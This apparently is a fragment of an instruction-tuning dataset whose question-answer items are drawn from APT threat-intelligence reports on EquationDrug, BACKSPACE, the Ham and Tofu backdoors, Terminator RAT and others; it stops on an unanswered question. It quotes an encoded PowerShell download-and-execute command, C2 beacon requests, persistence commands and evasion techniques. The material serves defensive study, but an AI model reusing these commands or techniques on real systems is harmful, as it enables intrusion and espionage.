    "instruction": "Context: Big Headline: Unilay.DLL\nThis module provides a compatibility layer for accessing system API functions for Windows 9x. It redirects Unicode (\"W\") variants of Windows API functions to corresponding ANSI variants by converting Unicode string parameters to multi-byte strings and calling the respective ANSI API.\nExported functions (redirected to ANSI variants):\n100017EF: CopyFileW\n10001039: CreateDirectoryW\n10001111: CreateFileW\n100011B3: CreateProcessW\n10001177: DeleteFileW\n10001516: FindFirstChangeNoti\u0141cationW\n10001466: FindFirstFileExW\n10001300: FindFirstFileW\n100014C6: FindNextFileW\n10001564: GetCurrentDirectoryW\n1000188F: GetFileAttributesW\n100016C6: GetStartupInfoW\n10001602: GetSystemDirectoryW\n10001664: GetWindowsDirectoryW\n10001853: LoadLibraryW\n1000178B: MoveFileExW\n1000172D: MoveFileW\n10001913: RegCreateKeyExW\n100019F5: RegDeleteKeyW\n10001DDF: RegDeleteValueW\n10001A39: RegEnumKeyExW\n10001BE2: RegEnumValueW\n1000199B: RegOpenKeyExW\n10001B23: RegQueryInfoKeyW\n10001D57: RegSetValueExW\n100010D5: RemoveDirectoryW\n10001E81: SHGetFileInfoW\n100015C6: SetCurrentDirectoryW\n100018CB: SetFileAttributesW\n10001E23: lstrcmpW\nAnswer this question: How does the Unilay.DLL module in the EquationDrug espionage platform ensure compatibility with older Windows systems, specifically Windows 9x? Explain the mechanism and its significance in the context of cyberespionage.",
    "output": "The Unilay.DLL module in the EquationDrug espionage platform ensures compatibility with older Windows systems, specifically Windows 9x, by providing a compatibility layer for accessing system API functions. This module redirects Unicode ('W') variants of Windows API functions to their corresponding ANSI variants. It achieves this by converting Unicode string parameters to multi-byte strings and then calling the respective ANSI API. This mechanism is significant because it allows the malware to operate seamlessly across different versions of Windows, ensuring broader compatibility and increasing the effectiveness of cyberespionage activities. By supporting both Unicode and ANSI APIs, the malware can interact with various system functionalities such as file operations, registry manipulations, and process management, thereby enhancing its ability to collect information and maintain persistence on targeted systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Equation group's GRAYFISH platform compare to Regin in terms of sophistication, and what advanced techniques does GRAYFISH employ for persistence and stealth?",
    "output": "The Equation group's GRAYFISH platform is considered more sophisticated than Regin due to its advanced features and stealth mechanisms. GRAYFISH exclusively uses the registry to store all malware-related modules and data in encrypted format, making it more flexible and harder to detect. It starts from the Volume Boot Record (VBR), loads the operating system, and hijacks the loading of the first driver in the kernel, making it almost invisible. Additionally, GRAYFISH and EQUATIONDRUG include a highly sophisticated persistence mechanism involving re-flashing the HDD firmware, a technique that is out of reach for most advanced threat groups.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: C2 Domains\nLike many BACKSPACE variants, this sample is configured with four different C2 domains. The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes \u2013 that is, each domain is associated with different URIs whose associated files support different functions.\nFor this sample, the four C2 domains have the following roles:\nTable 7: BACKSPACE C2 domains and registration dates\nMedium Headline: \"Run\" vs \"Hide\" Mode\nBACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\\Software\\Microsoft\\ CurrentHalInf. If it exists and is set to 1 the malware switches to \"Run Mode\"; otherwise the malware operates in \"Hidden Mode\".\nTo switch to \"Run mode\", BACKSPACE attempts to contact its C2 servers for validation and to obtain configuration data (stored in a file named nur.txt). It parses the configuration data and performs a series of increasingly generic checks to see whether (by inclusion or exclusion) it should remain in \"Run mode\":\n1. Make an HTTP request to www.iapfreecenter[.]com/Lnk1z/hostlist.txt and validate that the last byte of the response is 0xFE.\n2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to obtain the external IP of the victim computer.\n3. Make an HTTP request to either www.newpresses[.]com/http/nur.txt, www.km153[.]com/ http/nur.txt or www.appsecnic[.]com/http/nur.txt and validate that the response starts with \"abcd1234\"; if none of the servers respond accordingly, setting \"Run Mode\" fails.\n4. If the response from the server contains the \"runhost=\" option, search for the victim computer's hostname in the option data. If found, setting \"Run Mode\" succeeds; else go to step 5.\n5. If the response from the server contains the \"runhostexcept=\" option, search for the victim computer's hostname in the option data. If found, setting \"Run Mode\" fails; else go to step 6.\n6. If the response from the server contains the \"runip=\" option, search for the victim computer's external IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" succeeds; else go to step 7.\n7. If the response from the server contains the \"runipexcept=\" option, search for the victim computer's external IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" fails; else go to step 8.\n8. If the response from the server contains the \"rundir=\" option, search for the current C2 URL (e.g., www.iapfreecenter[.]com/Lnk1z) in the option data. If found, setting \"Run Mode\" succeeds; else go to step 9.\n9. If the response from the server contains the \"rundirexcept=\" option, search for the current C2 URL (e.g., www.iapfreecenter[.]com/Lnk1z) in the option data. If found, setting \"Run Mode\" fails; else go to step 10.\n10. If the response from the server contains the \"runweb=\" option, search for the current C2 domain (e.g., www.iapfreecenter[.]com) in the option data. If found, setting \"Run Mode\" succeeds; else go to step 11.\n11. If the response from the server contains the \"runwebexcept=\" option, search for the current C2 domain (e.g., www.iapfreecenter[.]com) in the option data. If found, setting \"Run Mode\" fails; else go to step 12.\n12. If the response from the server contains the \"runall=1\" option, setting \"Run Mode\" succeeds.\nIf switching to \"Run Mode\" fails, BACKSPACE reads the registry value PassPath under HKEY_CURRENT_ USER\\Software\\Microsoft\\CurrentHalInf, attempts to terminate the process identified by the registry data, and then exits.\nIf BACKSPACE successfully switches to \"Run Mode\", the hFlag registry value under HKEY_CURRENT_USER\\ Software\\Microsoft\\CurrentHalInf is deleted. The victim computer's hostname and IP are saved.\nA thread to switch the malware back to \"Hidden Mode\" is started. The thread runs indefinitely until the MicrosoftSYNoRegExit event gets signaled; once signaled, the thread signals the MicrosoftSYNoRegHaveExit event. In this thread, the malware reads the registry value PassPath under HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentHalInf, attempts to terminate the process identified by the registry data, and then exits.\nSimilar to switching to \"Run mode\" BACKSPACE conducts a series of checks to attempt to switch to \"Hidden Mode\":\n1. Make an HTTP request to www.iapfreecenter[.]com/Lnk1z/hostlist.txt and validate that the last byte of the response is 0xFF.\n2. Make an HTTP request to the legitimate URL automation.whatismyip[.]com/n09230945.asp to obtain the external IP of the victim computer.\n3. Make an HTTP request to either www.newpresses[.]com/some/edih.txt, www.km153[.]com/ some/edih.txt or www.appsecnic[.]com/some/edih.txt and validate that the response starts with \"abcd1234\"; if none of the servers respond accordingly, setting \"Hidden Mode\" fails.\n4. If the response from the server contains the \"killpath=\" option, write the option data to the registry value PassPath under HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentHalInf; this data represents the path of a process to be terminated.\n5. If the response from the server contains the \"hidehost=\" option, search for the victim computer's hostname in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 5.\n6. If the response from the server contains the \"hidehostexcept=\" option, search for the victim computer's hostname in the option data. If found, setting \"Hidden Mode\" fails; else go to step 6.\n7. If the response from the server contains the \"hideip=\" option, search for the victim computer's external IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 7.\n8. If the response from the server contains the \"hideipexcept=\" option, search for the victim computer's external IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" fails; else go to step 8.\n9. If the response from the server contains the \"hidedir=\" option, search for the current C2 URL (e.g., www.iapfreecenter[.]com/Lnk1z or www.appsecnic[.]com/Lnk1z) in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 9.\n10. If the response from the server contains the \"hidedirexcept=\" option, search for the current C2 URL in the option data. If found, setting \"Hidden Mode\" fails; else go to step 10.\n11. If the response from the server contains the \"hideweb=\" option, search for the current C2 domain (e.g., www.iapfreecenter[.]com or www.appsecnic[.]com) in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 11.\n12. If the response from the server contains the \"hidewebexcept=\" option, search for the current C2 domain in the option data. If found, setting \"Hidden Mode\" fails; else go to step 12.\n13. If the response from the server contains the \"hideall=1\" option, setting \"Hidden Mode\" succeeds.\nIf BACKSPACE successfully switches to \"Hidden Mode\" succeeds, the hFlag registry value under HKEY_ CURRENT_USER\\Software\\Microsoft\\CurrentHalInf is created and set to 1.\nThe malware stores the hostname of the victim computer's primary Domain Controller to be sent to the second stage C2 server as part of the host details data.\nMedium Headline: Download Additional Files\nBACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /Lnk1z/app.txt and saves the file to <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt. Next, the downloaded file is copied to <CSIDL_PROGRAMS>\\Messenger\\BIN as MessengerPlug.exe and if it is a valid PE file, a new process is started.\nIn addition, BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path / Lnk1z/hostlist.txt. If the victim computer's hostname is found in the response, BACKSPACE makes a new HTTP request to the primary C2 URL domain and URL path /Lnk1z/myapp.txt and saves the file to <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt. Next, the downloaded file is copied to <CSIDL_ PROGRAMS>\\Messenger\\BIN as MessengerForVista.exe and if it is a valid PE file, a new process is started.\nBACKSPACE will then delete the following files:\n\u2022 <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt\n\u2022 <CSIDL_PROGRAMS>\\Messenger\\BIN\\UpdateMessenger.exe\n\u2022 <CSIDL_PROGRAMS>\\Messenger\\BIN\\MessengerPlug.exe\n\u2022 <CSIDL_PROGRAMS>\\Messenger\\BIN\\MessengerForVista.exe\n\nQ: Describe the process by which APT30's BACKSPACE malware downloads and executes additional files from the C2 servers.",
    "output": "A: APT30's BACKSPACE malware downloads additional files by sending HTTP requests to the primary C2 URL domain and specific URL paths. First, it sends a request to /Lnk1z/app.txt and saves the file to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN\\\\Temp.txt. The downloaded file is then copied to <CSIDL_PROGRAMS>\\\\Messenger\\\\BIN as MessengerPlug.exe. If the file is a valid PE file, a new process is started. Additionally, BACKSPACE sends another request to /Lnk1z/hostlist.txt. If the victim computer's hostname is found in the response, a new request is made to /Lnk1z/myapp.txt, and the file is saved and copied similarly, resulting in MessengerForVista.exe being executed if valid. After these operations, BACKSPACE deletes the temporary and executable files to clean up traces of its activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nWorld War Z\u2014a bestselling book and Hollywood movie\u2014detailed a global pandemic in which politics and culture deeply influenced how the public\u2014and by extension, governments\u2014reacted to a zombie plague. In one passage, for example, an Arab boy refused to believe that the disease was real, suspecting that Israel had fabricated the story. The nations described in World War Z\u2014the United States, China, Russia, South Korea, Israel, and many others\u2014are involved in a very different type of conflict, but one with real and growing national security impact: World War C, where \"C\" stands for \"Cyber\". However, the same rule applies: each country has a unique political system, history, language, culture, and understanding of human and international conflict.\nCyber conflict often mirrors traditional conflict. For example, China uses high-volume cyber attacks similar to how it used infantry during the Korean War. Many Chinese soldiers were sent into battle with only a handful of bullets. Given their strength in numbers, they were still able to achieve battlefield victories. On the other end of the spectrum lie Russia, the U.S., and Israel, whose cyber tactics are more surgical, reliant on advanced technologies and the cutting-edge work of contractors who are driven by competition and financial incentives.\nWe are still at the dawn of the Internet Age. But cyber attacks have already proven themselves as a low-cost, high-payoff way to defend national sovereignty and to project national power. Many of today's headlines seem to be pulled from the pages of a science fiction novel. Code so sophisticated it destroys a nuclear centrifuge thousands of miles away. Malware that secretly records everything a user does on a computer. A software program that steals data from any nearby device that has Bluetooth connectivity. Encrypted code that decrypts only on one specific, target device. Such sophistication speaks volumes about the maturity, size, and resources of the organizations behind these attacks. With a few rare exceptions, these attacks are now in the exclusive realm of nation-states.\n\"The international community has developed a solid understanding of cyber technology,\" said Prof. Michael N. Schmitt of the U.S. Naval War College, in an email interview. \"What is missing is a grasp of the geopolitical context in which such technology operates. Attribution determinations made without sensitivity to the geopolitical surroundings are seldom reasonable.\"\nWorld War C, like any analogy, has its limits. Cyber war has been compared to special operations forces, submarine warfare, missiles, assassins, nuclear weapons, Pearl Harbor, 9/11, Katrina, and more. Even our zombie analogy is not new. Often, any compromised computer, if it is actively under the surreptitious control of a cybercriminal, is called a zombie, and botnets are sometimes called zombie armies. Also, compared to stockpiling tanks and artillery, writing cyber attack code, and compromising thousands if not millions of computers, is easy. Moreover, malware often spreads with the exponential growth of an infectious disease.\nThis report examines many publicly known cyber attacks. By exploring some of the distinctive national or regional characteristics of these attacks, organizations can better identify their attackers, anticipate future attacks, and defend themselves.\n\nHow does the cyber conflict strategy of China differ from that of countries like Russia, the U.S., and Israel? Why might this difference exist, and what implications does it have for cybersecurity experts?",
    "output": "A: China employs high-volume cyber attacks, similar to their infantry tactics during the Korean War, relying on sheer numbers to overwhelm defenses. This approach is effective due to the large number of attackers, even if individual capabilities are limited. In contrast, Russia, the U.S., and Israel use more targeted and sophisticated cyber tactics, leveraging advanced technologies and highly skilled contractors driven by competition and financial incentives. This difference likely stems from cultural, historical, and resource factors. For cybersecurity experts, understanding these distinctions helps in identifying attack patterns, attributing attacks to specific actors, and tailoring defense strategies accordingly. Recognizing the high-volume approach of China can inform the need for robust, scalable defenses, while awareness of surgical tactics from other nations highlights the importance of advanced threat detection and response capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Propagation and Targeting\nTo date, all observed attacks were the result of spear phishing attempts against the victim organizations. The latest batch used well-crafted LNK files contained within similarly named password-protected ZIP files. The LNK files, when opened, would execute a PowerShell command via 'cmd.exe /c' to download and execute an additional payload. The attackers appeared to prefer the Google URL shortening service 'goog.gl,' however, this could easily change as the attacks evolve.\npowershell.exe -nop \u2013w hidden -exec bypass -enc\n\"JAAyAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQB\nMedium Headline: Figure 2: Decoded PowerShell Snippet\nThe shortened URL connected to 'hxxxp://koala (dot) acsocietyy (dot) com/acc/image/20170112001 (dot) jpg.' This file was in fact another piece of PowerShell code modified from '(<https://github.com/PowerShellMafia/PowerSploit>)PowerSploit'. That file opens a decoy document and executes an approximately 60kb chunk of position independent shellcode. The shellcode upon further decoding and analysis is nearly identical to what Cylance calls 'The Ham Backdoor' below. This particular variant of the backdoor references itself internally as version '1.6.4' and beaconed to 'gavin (dot) ccfchrist (dot) com.'\n\u2022 ae0dd5df608f581bbc075a88c48eedeb7ac566ff750e0a1baa7718379941db86 20170112003.jpg\n\u2022 75ef6ea0265d2629c920a6a1c0d1dd91d3c0eda86445c7d67ebb9b30e35a2a9f 20170112002.jpg\n\u2022 723983883fc336cb575875e4e3ff0f19bcf05a2250a44fb7c2395e564ad35d48 20170112007.jpg\n\u2022 3d5e3648653d74e2274bb531d1724a03c2c9941fdf14b8881143f0e34fe50f03 20170112005.jpg\n\u2022 471b7edbd3b344d3e9f18fe61535de6077ea9fd8aa694221529a2ff86b06e856 20170112.jpg\n\u2022 4ff6a97d06e2e843755be8697f3324be36e1ebeb280bb45724962ce4b671029720170112001.jpg\n\u2022 9fbd69da93fbe0e8f57df3161db0b932d01b6593da86222fabef2be31899156d20170112006.jpg\n\u2022 f45b183ef9404166173185b75f2f49f26b2e44b8b81c7caf6b1fc430f373b50b 20170112008.jpg\n\u2022 646f837a9a5efbbdde474411bb48977bff37abfefaa4d04f9fb2a05a23c6d543 20170112004.jpg\nThe payloads contained within each PowerShell script beaconed to the same domain name, with the exception of '20170112008.jpg', which beaconed to 'hamiltion (dot) catholicmmb (dot) com.'\nEarlier attempts used EXE's disguised with Microsoft Word document icons and DOCX files within a similarly named ZIP file as documented by JPCERT. Cylance has observed the following ZIP files which contained a similarly named executable:\n\u2022 \u5e73\u621029\u5e74\u65e5\u7c73\u5b89\u4fdd\u6226\u7565\u5bfe\u8a71\u63d0\u8a00(\u672a\u5b9a\u7a3f).zip\n\u2022 2016\u770c\u7acb\u5927\u5b66\u30b7\u30f3\u30dd\u30b8\u30a6\u30e0A4_1025.zip\n\u2022 \u65e5\u7c73\u95a2\u4fc2\u91cd\u8981\u4e8b\u9805\u4e00\u89a7\u8868.zip\n\u2022 \u30ed\u30b7\u30a2\u6b74\u53f2\u5354\u4f1a\u306e\u8a2d\u7acb\u3068\u300c\u5358\u4e00\u300d\u56fd\u53f2\u6559\u79d1\u66f8\u306e\u4f5c\u6210.zip\n\u2022 \u65e5\u7c73\u62e1\u5927\u6291\u6b62\u5354\u8b70.zip\n\u2022 \u500b\u4eba\u756a\u53f7\u306e\u63d0\u4f9b\u306b\u3064\u3044\u3066.zip\n\u2022 11\u6708\u65b0\u5b66\u800c\u4f1a.zip\nMedium Headline: The Ham Backdoor\nThe Ham Backdoor functions primarily as a modular platform, which provides the attacker with the ability to directly download additional modules and execute them in memory from the command and control (C2) server. The backdoor was programmed in C++ and compiled using Visual Studio 2015. The modules that Cylance has observed so far provided the ability to:\n\u2022 Upload specific files to the C2\n\u2022 Download a file to the infected machine\n\u2022 Load and execute a DLL payload\n\u2022 List running processes and services\n\u2022 Execute a shell command\n\u2022 Add an additional layer of AES encryption to the network protocol\n\u2022 Search for a keyword in files\nLegacy AV appears to have fairly good coverage for most of the samples; however, minor changes in newer samples have considerably lower detection rates. JPCERT calls this backdoor 'ChChes' for cross-reference. The malware employs a number of techniques for obfuscation, such as stack construction of variables and data, various XOR encodings and data reordering schemes, and some anti-analysis techniques. Perhaps the most interesting of these, and the one we've chosen to key on from a detection perspective, is the following bit of assembly which was the final component in decoding a large encoded block of code:\nlea edx, [esi+edi]\nmov edi, [ebp+var_4]\nmov cl, [ecx+edx]\nxor cl, [eax+edi] inc eax\nmov edi, [ebp+arg_8]\nmov [edx], cl\nmov ecx, [ebp+arg_0]\ncmp eax, ebx\nThis snippet in the analyzed samples used a fixed size XOR key usually 0x66 bytes long but would sequentially XOR every byte by each value of the key. This effectively results in a single byte XOR by the end of the operation. This operation made little sense in comparison to the other more complicated reordering and longer XOR encodings used prior to this mechanism. Cylance only found two variants to this code-block, however, that could be easily modified by the attacker in the future. The code also makes extensive use of the multi-byte NOP operation prefixed by 0x0F1F. These operations present somewhat of a problem for older disassemblers such as the original Ollydbg, but are trivially patched.\nThe network protocol of the backdoor is well described by JPCERT, but Cylance has taken the liberty to clean up their original python snippet, which was provided for decoding the cookie values:\nAs noted in the JPCERT report, Cylance also found that in most cases of successful infection, one of the earliest modules downloaded onto the system added an additional layer of AES communication to the traffic. The backdoor would also issue anomalous HTTP requests with the method 'ST' in the event that the C2 server did not respond appropriately to the initial request.\nAn example request is shown below:\nST /2C/H.htm HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET\nCLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nHost: kawasaki.unhamj(dot)com\nContent-Length: 0\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: uQ=[REDACTED];omWwFSA=hw4biTXvqd%2FhK2TIyoLYj1%2FShw6MhEGHlWurHsUyekeuunmop4kZ;Tgnfm5E=RPBaxi%2Bf4B2r6CTd9jh5u3AHOwuyVaJeuw%3D%3D Accept: */*\nMedium Headline: 'HT Srl' Certificate Details:\nStatus: Revoked\nIssuer: VeriSign Class 3 Code Signing 2010 CA\nValid: 1:00 AM 8/5/2011 to 12:59 AM 8/5/2012\nThumbprint: B366DBE8B3E81915CA5C5170C65DCAD8348B11F0\nSerial Number: 3F FC EB A8 3F E0 0F EF 97 F6 3C D9 2E 77 EB B9\nWhy the attackers chose to use this expired certificate to sign their malware samples is unknown. The malware itself bears little resemblance to previous hacking team implants and was likely done purely as an attempt to throw off attribution. The only observed persistence method to date is the use of the standard Windows Run key 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' under either a user's hive or HKLM. Cylance found that the following three full file paths were commonly used by this particular backdoor:\n\u2022 %AppData%\\Reader.exe\n\u2022 %AppData%\\Notron.exe\n\u2022 %AppData%\\SCSI_Initiarot.exe\nCylance also identified an earlier sample, which took advantage of a self-extracting RAR and a side loading vulnerability in the legitimate Microsoft Resource Compiler, 'RC.exe.' RC.exe will load the DLL 'RCDLL.dll' via its import table. This modified DLL was responsible for XOR decoding and mapping the shellcode version of the Ham Backdoor. This particular sample was stored in a file called 'RC.cfg', which was encoded using a single byte XOR against the key of 0x54. It appears that this version was only used in early campaigns, as the latest referenced backdoor version Cylance identified was 'v1.2.2.'\nBig Headline: Tofu Backdoor\nBased upon Cylance's observations, the Tofu Backdoor was deployed in far fewer instances than the Ham Backdoor. It is a proxy-aware, fully-featured backdoor programmed in C++ and compiled using Visual Studio 2015. The Tofu backdoor makes extensive use of threading to perform individual tasks within the code. It communicates with its C2 server through HTTP over nonstandard TCP ports, and will send encoded information containing basic system information back, including hostname, username, and operating system within the content of the POST.\nPOST /586E32A1FFFFFFFF.aspx HTTP/1.1 Accept: */* Cookies: Sym1.0: 0 ,Sym2.0: 0 ,Sym3.0: 61456\n,Sym4.0: 1\nHost: area.wthelpdesk.com:443\nContent-Length: 39\nConnection: Keep-Alive\nCache-Control: no-cache\nMedium Headline: Figure 5: Example POST Request From the Tofu Backdoor\nAlthough communication took place on TCP port 443, none of the traffic was encrypted and the custom cookies 'Sym1.0' \u2013 'Sym4.0' can be used to easily identify the backdoor in network traffic. The backdoor has the ability to enumerate processor, memory, drive, and volume information, execute commands directly from the attacker, enumerate and remove files and folders, and upload and download files. Commands were sent by the C2 and processed by the backdoor in the form of encoded DWORDs, each correspondeding to a particular action listed above. Tofu may also create two different bi-directional named pipes on the system '\\\\.\\pipe\\1[12345678]' and '\\\\.\\pipe\\2[12345678]' which could be accessed via other compromised machines on the internal network.\nDuring an active investigation, the file was found at '%AppData%\\iSCSI_Initiarot.exe'. This path was confirmed as a static location in the code that the backdoor would use to copy itself. A static Run key was also used by the backdoor to establish persistence on the victim machine (HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft iSCSI Initiator).\nAll of the samples Cylance identified were compiled in November 2016, so these backdoors may have simply been tests as later samples moved back to the shellcode-based Ham Backdoors. The backdoors were also similarly signed using the same stolen code-signing certificate from 'HT Srl.'\nQuestion: Describe the obfuscation techniques used by the Ham Backdoor and how they complicate analysis efforts. What specific technique stands out and why?",
    "output": "Answer: The Ham Backdoor employs several obfuscation techniques, including stack construction of variables and data, various XOR encodings and data reordering schemes, and anti-analysis techniques. One notable technique involves a fixed size XOR key, usually 0x66 bytes long, which sequentially XORs every byte by each value of the key, resulting in a single byte XOR by the end. This operation is unusual compared to other more complicated reordering and longer XOR encodings used prior to this mechanism.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Dalbit group ensure persistence of the FRP tool within certain companies, and what command was used to execute the registered scheduler?",
    "output": "The Dalbit group ensured persistence of the FRP tool by registering it to the task scheduler (schtasks) under the name 'debug'. The command used to execute the registered scheduler was 'schtasks /tn debug /run'. This method allowed the FRP tool to maintain its presence and functionality within the affected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Evasive Tactics: Terminator RAT\nFireEye Labs has been tracking a variety of advanced persistent threat (APT) actors that have been slightly changing their tools, techniques, and procedures (TTPs) in order to evade network defenses. Earlier, we documented changes to (<http://www.fireeye.com/blog/technical/2013/08/survival-of-the-fittest-new-york-times-attackers-evolve-quickly.html>)Aumlib, the malware used in the attack against the New York Times, and (<http://www.fireeye.com/blog/technical/2013/09/evasive-tactics-taidoor-3.html>)Taidoor, a malware family that is being used in ongoing cyber-espionage campaigns particularly against entities in Taiwan. In this post we will explore changes made to Terminator RAT (Remote Access Tool) by examining a recent attack against entities in Taiwan.\nWe recently analyzed a sample that we suspect was sent via spear-phishing emails to targets in Taiwan. As shown in Figure 1, the adversary sends a malicious Word document, \"103.doc\" (md5: a130b2e578d82409021b3c9ceda657b7), that exploits CVE-2012-0158, which subsequently drops a malware installer named \"DW20.exe\". This particular malware is interesting because of the following:\nIt evades sandbox by terminating and removing itself (DW20.exe) after installing. Malicious behavior will only appear after reboot.\nIt deters single-object based sandbox by segregation of roles between collaborating malwares. The RAT (svchost_.exe) will collaborate with its relay (sss.exe) to communicate with the command and control server.\nIt deters forensics investigation by changing the startup location.\nIt deters file-based scanning that implements a maximum file size filter, by expanding the size of svchost_.exe to 40MB.\nThe ultimate payload of the attack is (<http://www.malware.lu/Pro/RAP002_APT1_Technical_backstage.1.0.pdf>)Terminator RAT, which is also known as (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf>)FakeM RAT. This RAT does not appear to be exclusively used by a single APT actor, but is most likely being used in a variety (of possibly otherwise unrelated) campaigns. In the past, this RAT has been used against Tibetan and Uyghur activists, and we are seeing an increasing number of attacks targeting Taiwan as well.\nHowever, these attacks use some evasive tactics that demonstrate the evolution of Terminator RAT. First, the attackers have included a component that relays traffic between the malware and a proxy server. Second, they have modified the 32-byte magic header that in previous versions attempted to disguise itself to look like either MSN Messenger, Yahoo! Messenger, or HTML code.\nThese modifications appear to be an attempt to evade network defenses, perhaps in response to defender's increasing knowledge of the indicators of compromise associated with this malware. We\nwill discuss the individual components of this attack in more detail.\nQuestion: What specific evasive tactics are employed by the Terminator RAT to deter forensics investigation and file-based scanning? Discuss how these tactics work and their implications for cybersecurity professionals.",
    "output": "Answer: The Terminator RAT employs several evasive tactics to deter forensics investigation and file-based scanning. One tactic involves changing the startup location of the malware, which makes it harder for investigators to locate and analyze the malicious files. Another tactic is to expand the size of the executable file (svchost_.exe) to 40MB. This is done to deter file-based scanning that implements a maximum file size filter, as many scanners might skip large files to save resources. These tactics are significant because they increase the difficulty for cybersecurity professionals to identify and mitigate the malware. By altering startup locations and inflating file sizes, the RAT complicates the forensic analysis process and reduces the effectiveness of traditional scanning methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the WhiteBear loader manage its runtime flow, specifically in terms of mutex creation, pipe communication, and payload extraction?",
    "output": "The WhiteBear loader creates a mutex '{531511FA-190D-5D85-8A4A-279F2F592CC7}' and waits up to two minutes if it is already present, logging the message 'IsLoaderAlreadyWork +'. It then creates a named pipe for communication with the target process and the transport module. The pipe name is generated using either fixed values or values calculated from the current date and a munged user SID. The loader reads its own image body and writes it to the pipe, extracts the payload body from resource BINARY 202, finds the running process that matches the target name, copies the buffer containing the payload into the process, and starts its copy in the target process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nIn this paper, we reveal recent\t\n \u00a0ongoing APT activity likely associated with long-\u00ad\u2010running threat\t\n \u00a0campaigns and the presumed\t\n \u00a0existence of associated malcode, dubbed the Four Element\t\n \u00a0Sword Builder, used to weaponize RTF documents for use in these campaigns. A sample of twelve different\t\n \u00a0targeted exploitation incidents (taken from a\t\n \u00a0larger set\t\n \u00a0of activity) are described along any discovered connections to previously documented threat\t\n \u00a0campaigns.\nFour vulnerabilities -\u00ad\u2010 CVE-\u00ad\u20102012-\u00ad\u20100158,\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856,\t\n \u00a0CVE-\u00ad\u20102015-\u00ad\u20101641, and CVE-\u00ad\u20102015-\u00ad\u20101770\t\n \u00a0\u2013 related to the parsing of Microsoft\t\n \u00a0Rich Text\t\n \u00a0File (RTF) documents are being \t\n \u00a0leveraged by advanced threat\t\n \u00a0actors to launch exploitation campaigns against\t\n \u00a0members of the Tibetan community, along with journalists and human rights workers in Hong Kong and Taiwan. One of these vulnerabilities \u2013 CVE-\u00ad\u20102015-\u00ad\u20101641\t\n \u00a0-\u00ad\u2010 has been typically used\t\n \u00a0in\t\n \u00a0cybercrime operations starting in 2015 and has not\t\n \u00a0been widely observed in use by Advanced Persistent\t\n \u00a0Threat\t\n \u00a0(APT) actors until now.\t\n \u00a0The vulnerabilities are being used to deliver Chinese-\u00ad\u2010oriented malware payloads such as Grabber, T9000, Kivars, PlugX, Gh0StRAT and Agent.XST.\nAnalysis of malware payloads,\t\n \u00a0malware metadata and actor group Tactics, Techniques and Procedures (TTP's) provides useful\t\n \u00a0insight\t\n \u00a0into the malware, targeting, and links to past threat\t\n \u00a0actor infrastructure. Indicator overlap reveals a\t\n \u00a0connection to prior exploitation campaigns against\t\n \u00a0the World Uyghur Congress\t\n \u00a0(WUC)\t\n \u00a0from\t\n \u00a02009-\u00ad\u20102014 as presented in 2014 at\t\n \u00a0the Usenix security conference [1].\t\n \u00a0Additional indicators suggest\t\n \u00a0an overlap with the actors behind \"Operation Shrouded Crossbow\".\nThis recent\t\n \u00a0activity matches pre-\u00ad\u2010existing targeting patterns towards the \"Five Poisons\" [2] -\u00ad\u2010 organizations and individuals associated with perceived threats to Chinese government\t\n \u00a0rule: Uyghurs,\t\n \u00a0Tibetans,\t\n \u00a0Falun Gong,\t\n \u00a0members of the democracy movement and advocates for an independent\t\n \u00a0Taiwan. This targeting scheme, along with various malware artifacts and associated metadata, suggest that the threat\t\n \u00a0actors herein have a\t\n \u00a0Chinese \t\n \u00a0nexus.\nAdditional malware following the same type of patterns described has been discovered since this report\t\n  was written, and suggests that\t\n  these generalized threat\t\n  campaigns using weaponized RTF documents are ongoing.\n\nAnswer this question based on the above context: What insights can be gained from analyzing the malware payloads and metadata associated with the Four Element Sword Builder, and how do these insights help in understanding the broader threat landscape?",
